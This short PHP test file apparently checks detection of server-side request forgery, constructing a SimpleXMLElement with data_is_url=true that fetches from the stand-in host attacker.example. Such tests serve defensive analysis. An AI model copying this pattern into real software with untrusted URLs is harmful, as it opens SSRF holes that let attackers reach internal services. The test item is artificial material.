--TEST--
SSRF via SimpleXMLElement constructor with data_is_url=true
--FILE--
<?php

$x = new SimpleXMLElement('http://attacker.example/', 0, true);
return (string) $x;
